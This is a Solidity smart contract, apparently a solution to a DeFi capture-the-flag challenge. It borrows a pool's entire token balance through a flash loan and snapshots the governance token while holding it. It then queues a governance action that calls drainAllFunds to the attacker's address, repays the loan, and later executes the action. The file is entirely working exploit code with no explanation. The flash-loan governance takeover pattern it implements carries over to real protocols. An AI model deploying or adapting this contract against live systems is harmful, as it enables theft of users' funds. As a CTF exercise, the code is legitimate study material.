pragma solidity ^0.8.0;

interface ILoan {
    function flashLoan(uint256 amount) external;
}

interface IDVT {
    function transfer(address to, uint256 amount) external;

    function balanceOf(address to) external returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function snapshot() external returns (uint256);
}

interface IGov {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract attackSelfie {
    ILoan loan;
    IDVT token;
    IGov governance;
    address owner;
    uint256 actionId;

    constructor(
        address _loan,
        address _token,
        address _gov
    ) {
        loan = ILoan(_loan);
        token = IDVT(_token);
        governance = IGov(_gov);
        owner = msg.sender;
    }

    function attack() external {
        loan.flashLoan(token.balanceOf(address(loan)));
    }

    function receiveTokens(address receiver, uint256 amount) external {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        actionId = governance.queueAction(address(loan), data, 0);
        token.transfer(address(loan), amount);
    }

    function executeAction() external {
        governance.executeAction(1);
    }

    fallback() external payable {}

    receive() external payable {}
}
